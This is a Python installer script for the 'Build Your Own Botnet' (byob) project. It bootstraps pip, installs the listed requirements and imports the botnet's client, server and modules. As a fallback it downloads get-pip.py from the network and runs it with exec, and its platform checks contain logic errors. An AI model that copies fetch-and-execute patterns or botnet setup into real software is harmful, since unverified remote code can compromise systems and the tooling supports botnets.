#!/usr/bin/python
"""
88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

__all__     = ['client','modules','server']
__author__  = 'Daniel Vega-Myhre'
__license__ = 'GPLv3'
__version__ = '0.1.2'

# standard libarary

import os
import sys
import time
import urllib
import logging
import ensurepip
import subprocess

def main():
    root_dir = os.getcwd()
    requires = os.path.normpath(os.path.abspath(os.path.join(root_dir, 'requirements.txt' if os.name == 'nt' else 'requirements-windows.txt')))
    debugger = logging.getLogger(__name__)
    debugger.setLevel(logging.DEBUG)
    debugger.addHandler(logging.StreamHandler())

    # check if pip installed
    try:
        pip_path = subprocess.check_output('where pip' if os.name is 'nt' else 'which pip', shell=True).rstrip()
    except Exception as e:
        debugger.debug("Error in pip package installer: {}".format(str(e)))

        # install pip if missing
        try:
            bootstrap = ensurepip.bootstrap()
        except Exception as e:
            debugger.debug("Error bootstrapping pip into Python: {}".format(str(e)))
            try:
                exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
            except Exception as e:
                debugger.debug("Error installing pip: {}".format(str(e)))

        # restart
        os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])

    if globals().get('pip_path'):
        with open(requires, 'r') as fp:
            for package in fp.readlines():
                try:
                    pip_install = subprocess.Popen('{} install {}'.format(pip_path, package), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
                except Exception as e:
                    debugger.debug("Error installing package: {}".format(package))

        # client
        try:
            import byob.client
        except Exception as e:
            debugger.debug("Error in byob.client: {}".format(str(e)))

        # server
        try:
            import byob.server
        except Exception as e:
            debugger.debug("Error in byob.server: {}".format(str(e)))

        # modules
        try:
            import byob.modules
        except Exception as e:
            debugger.debug("Error in byob.modules: {}".format(str(e)))


if __name__ == '__main__':
    main()